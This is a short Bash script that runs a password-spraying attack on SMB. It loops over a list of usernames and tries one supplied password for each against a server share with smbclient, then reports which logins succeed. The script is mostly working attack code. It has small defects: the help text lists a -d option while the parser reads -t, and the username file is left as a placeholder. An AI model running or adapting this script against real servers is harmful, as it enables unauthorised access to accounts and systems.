#!/bin/bash

trap ctrl_c INT
function ctrl_c(){
	echo -e "\e[0;35m[*]\e[0m\e[1;33mSaliendo...\e[0m\e[0;35m[*]\e[0m\n"
	exit 0
	tput cnorm
}


function helppanel(){
	echo -e "\e[0;35m[*]\e[0m\e[1;33mUsage: $0 [-p PASSWORD] [-d DOMAIN_OR_IP] [-s SHARE]\e[0m\e[0;35m[*]\e[0m\n"
    	echo -e "\e[0;35m[*]\e[0m\e[1;33m -p PASSWORD       Specify the password to use \e[0m\e[0;35m[*]\e[0m\n"
    	echo -e "\e[0;35m[*]\e[0m\e[1;33m -d DOMAIN_OR_IP   Specify the domain or IP address of the server\e[0m\e[0;35m[*]\e[0m\n"
    	echo -e "\e[0;35m[*]\e[0m\e[1;33m -s SHARE          Specify the share name\e[0m\e[0;35m[*]\e[0m\n"
    	echo -e "\e[0;35m[*]\e[0m\e[1;33m -h                Display this help message\e[0m\e[0;35m[*]\e[0m\n"
    	exit 1
}


function brute(){
echo $share
echo $password
echo $domain_or_ip
while IFS= read -r username; do
    echo "Trying username: $username with password: $password"
    
  
    smbclient //$domain_or_ip/$share -U $username%$password -c exit

  
    if [ $? -eq 0 ]; then
        echo "Login successful for user: $username"
    else
        echo "Login failed for user: $username"
    fi
done < [INPUT FROM USERS FILE]
}
#Main function
declare -i parameter_counter=0; while getopts "t:s:p:h:" arg;do
	case $arg in
		t) domain_or_ip="$OPTARG"; let parameter_counter+=1 ;;
		s) share="$OPTARG";  let parameter_counter+=1 ;;
		p) password="$OPTARG"; let parameter_counter+=1 ;;
		h) helppanel ;;
	esac
done

if [ $parameter_counter -lt 3 ];then
	helppanel
else
	brute
fi
